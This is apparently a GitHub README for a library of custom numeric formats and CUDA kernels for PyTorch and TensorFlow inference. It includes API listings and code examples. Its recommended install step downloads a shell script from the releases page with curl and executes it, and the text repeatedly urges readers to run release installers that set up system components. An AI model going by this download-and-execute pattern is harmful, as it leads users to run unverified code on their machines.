https://github.com/alexjoseLopez/arbitrary-number/releases

# Arbitrary Number — Custom Numeric Formats for GPU ML Performance 🚀

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/alexjoseLopez/arbitrary-number/releases)
[![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)
[![PyTorch](https://img.shields.io/badge/pytorch-supported-orange?logo=pytorch)](https://pytorch.org/)
[![TensorFlow](https://img.shields.io/badge/tensorflow-supported-ff6f00?logo=tensorflow)](https://www.tensorflow.org/)
[![CUDA](https://img.shields.io/badge/cuda-10%2B-green?logo=nvidia)](https://developer.nvidia.com/cuda-toolkit)

Topics: ai-inference, ai-performance, consumer-gpu, cuda, deep-learning, edge-inference, gpu, machine-learning, model-optimization, model-serving, numerical-computing, nvidia, python, pytorch, tensorflow

![GPU Matrix](https://images.nvidia.com/content/dam/en-zz/Solutions/design-visualization/gpu-architecture-illustration.png)

Overview
--------

Arbitrary Number implements configurable numeric formats and GPU kernels for model inference and training. It gives you control over mantissa, exponent, sign, and block formats. Use it to test custom floating point schemes, reduce memory, and tune compute for target hardware. The code targets NVIDIA GPUs via CUDA, and integrates with PyTorch and TensorFlow runtimes.

Key goals
- Evaluate custom floating and fixed formats for ML workloads.
- Provide high-performance CUDA kernels for the most common operations.
- Offer conversion tools for models and checkpoints.
- Provide a stable Python API for experiments and production serving.

Why this matters
- Numeric format drives model size, latency, throughput, and energy.
- Small changes in format can yield large gains when matched to hardware.
- This repo lets you iterate on formats without revamping your model.

Features
--------
- Flexible numeric formats: custom exponent, mantissa, sign, bias.
- Support for block floating formats and hybrid schemes.
- CPU reference implementations for correctness checks.
- CUDA kernels for GEMM, conv, and elementwise ops using custom formats.
- PyTorch and TensorFlow wrappers for model-level integration.
- Model conversion tools to export and import quantized parameters.
- Benchmarks and scripts for profiling on consumer GPUs.

Badges and compatibility
- Works with CUDA 10+, cuDNN, cuBLAS.
- Tested on NVIDIA consumer GPUs and data-center GPUs.
- Compatible with PyTorch 1.7+ and TensorFlow 2.x.

Quick links
-----------
- Releases: https://github.com/alexjoseLopez/arbitrary-number/releases
  - The release page hosts the binary installers and platform scripts. Download the installer or asset that matches your platform, then execute the file to set up system components and prebuilt kernels.

Installation
------------
Options: pip wheel, source build, or release installer.

1) Release installer (recommended for prebuilt CUDA kernels)
- Visit the releases page: https://github.com/alexjoseLopez/arbitrary-number/releases
- Download the installer asset for your platform (for example, arbitrary-number-install-linux.sh or arbitrary-number-win64.zip).
- Make the installer executable and run it:
  ```
  curl -L -o arbitrary-number-install.sh https://github.com/alexjoseLopez/arbitrary-number/releases/download/v1.0/arbitrary-number-install.sh
  chmod +x arbitrary-number-install.sh
  ./arbitrary-number-install.sh
  ```
- The installer deploys CUDA kernels, Python extension wheels, and CLI tools.

2) Pip (pure Python + optional wheels)
- From PyPI:
  ```
  pip install arbitrary-number
  ```
- For CUDA wheel builds, use the platform wheel built in releases or build locally.

3) From source
- Clone and build:
  ```
  git clone https://github.com/alexjoseLopez/arbitrary-number.git
  cd arbitrary-number
  pip install -r requirements.txt
  python setup.py build_ext --inplace
  pytest -q
  ```

Core concepts
-------------
- Format(spec): Defines sign bit, exponent bits, mantissa bits, and bias. Example: Format(s=1, e=5, m=10, bias=15).
- BlockFP: Group values into blocks and share exponent per block to improve dynamic range and reduce storage.
- Quantize: Map float32 tensors to a target format with rounding, saturation, and optional stochastic noise.
- Kernel: High-performance CUDA kernels implement key ops in the target format.
- Runtime: A small runtime manages conversion buffers, fused kernels, and host-device data movement.

Quickstart — PyTorch
--------------------
Minimal example: apply a custom numeric format to a model parameter and run inference.

```
import torch
from arbitrary_number.formats import Format
from arbitrary_number.pytorch import quantize_tensor, convert_model

fmt = Format(sign=1, exponent=6, mantissa=9, bias=31)

# Quantize a tensor
x = torch.randn(4, 1024, device='cuda')
x_q = quantize_tensor(x, fmt)

# Convert a pretrained model for inference
model = torch.hub.load('pytorch/vision:v0.10.0', 'resnet18', pretrained=True).cuda().eval()
model_q = convert_model(model, fmt, backend='cuda')

# Run inference
with torch.no_grad():
    out = model_q(x_q)
```

Quickstart — TensorFlow
-----------------------
Minimal example for TF2:

```
import tensorflow as tf
from arbitrary_number.tensorflow import tf_quantize, tf_convert_model
from arbitrary_number.formats import Format

fmt = Format(sign=1, exponent=5, mantissa=10, bias=15)

x = tf.random.normal([1, 224, 224, 3])
x_q = tf_quantize(x, fmt)

# Convert Keras model
model = tf.keras.applications.MobileNetV2(weights='imagenet')
model_q = tf_convert_model(model, fmt, backend='cuda')

pred = model_q(x_q, training=False)
```

APIs
----
Main modules
- arbitrary_number.formats
  - Format(sign, exponent, mantissa, bias)
  - BlockFormat(block_size, exponent_bits, mantissa_bits, shared_exponent=True)
- arbitrary_number.core
  - quantize_tensor(tensor, fmt, mode='round', stochastic=False)
  - dequantize_tensor(qtensor)
  - cast_tensor(tensor, target_dtype)
- arbitrary_number.cuda
  - cu_gemm(a, b, out, fmt, stream=None)
  - cu_conv2d(input, kernel, out, fmt, stride=1, padding=0)
- arbitrary_number.pytorch
  - convert_model(model, fmt, backend='cuda', preserve_batchnorm=False)
  - quantize_state_dict(state_dict, fmt)
- arbitrary_number.tensorflow
  - tf_quantize, tf_convert_model
- arbitrary_number.tools
  - profile_model(model, data_loader, fmt)
  - export_to_onnx(model, fmt)
  - trt_infer(trt_engine, input, fmt)

Performance and benchmarking
----------------------------
Benchmarks target throughput (images/s) and latency (ms). Use the provided scripts to measure:

```
python benchmarks/bench_gemm.py --format e5m10 --size 4096 --repeat 200
python benchmarks/bench_conv2d.py --model resnet50 --format e4m11 --batch 16
```

Tips for realistic benchmarks
- Pin threads and set CUDA_VISIBLE_DEVICES.
- Warm up GPU for several iterations before measuring.
- Use native cuBLAS or cuDNN profiles as baseline.

Expected gains
- Reduced memory bandwidth cost for parameters and activations.
- Lower memory footprint on edge devices.
- Throughput improvements depend on operator fusion and kernel efficiency.
- Gains vary with model type, batch size, and layer mix.

Model conversion and serving
---------------------------
Conversion flow
1. Quantize weights and activations offline.
2. Replace critical ops with fused custom kernels.
3. Optionally export to ONNX and feed to a custom runtime or TensorRT plugin.

ONNX and TensorRT
- Export quantized weights into ONNX using export_to_onnx.
- Use the TensorRT plugin folder in tools/trt_plugins to build a TRT engine that understands the custom format.
- Deploy the engine using the included trt_infer tool.

Edge inference
--------------
- Use block formats for per-block exponent sharing on embedded GPUs.
- For CPU-only edge targets, use integer-backed formats and hand-tuned kernels.
- The repo includes armv8 reference kernels in tools/arm for embedded testing.

Kernel development
------------------
- Kernels live under src/cuda.
- Follow the pattern in src/cuda/gemm.cu for writing fused kernels.
- Use the provided device test harness to validate correctness.

Example: writing a kernel
- Implement quantized load/store.
- Fuse conversion and compute to avoid extra memory passes.
- Use shared memory for block formats.

Testing and validation
----------------------
- Unit tests use pytest and run on CPU by default.
- CUDA tests run on CI when a GPU is available. Local users can run:
  ```
  pytest tests/cuda -q
  ```
- Use the reference CPU implementations to validate correctness.

Best practices
--------------
- Start with a conservative format: moderate mantissa and exponent bits.
- Profile layer by layer. Convert bottleneck layers first.
- Use stochastic rounding only for training or fine-tuning.
- Preserve batchnorm parameters in full precision unless you test conversion benefits.

Command line tools
------------------
- arbn-format-info: inspect formats and compute dynamic range and precision.
- arbn-quantize: quantize a model checkpoint on disk.
- arbn-benchmark: run standard benchmarks for common models.

Contributing
------------
- Fork the repo and open a PR.
- Follow the style guide in CONTRIBUTING.md.
- Run unit tests and add tests for new kernels.
- Provide performance numbers for any kernel changes.

Releases
--------
Visit the releases page for installers and prebuilt wheels:
[Download releases and installers](https://github.com/alexjoseLopez/arbitrary-number/releases)

The releases page includes platform assets. Download the matching asset and execute it. The installer sets up the Python package, installs prebuilt CUDA kernels, and copies helper binaries.

License
-------
MIT License. See LICENSE file for full terms.

Acknowledgements and links
--------------------------
- NVIDIA CUDA and cuBLAS for GPU primitives.
- PyTorch and TensorFlow for runtime integration.
- Community contributions that shaped format ideas.

Logos
-----
![PyTorch Logo](https://raw.githubusercontent.com/pytorch/pytorch/master/docs/source/_static/img/pytorch-logo.png)
![TensorFlow Logo](https://www.tensorflow.org/images/tf_logo_social.png)
![NVIDIA Logo](https://upload.wikimedia.org/wikipedia/commons/2/21/Nvidia_logo.svg)

Contact
-------
Open issues on GitHub for bugs, feature requests, or performance reports.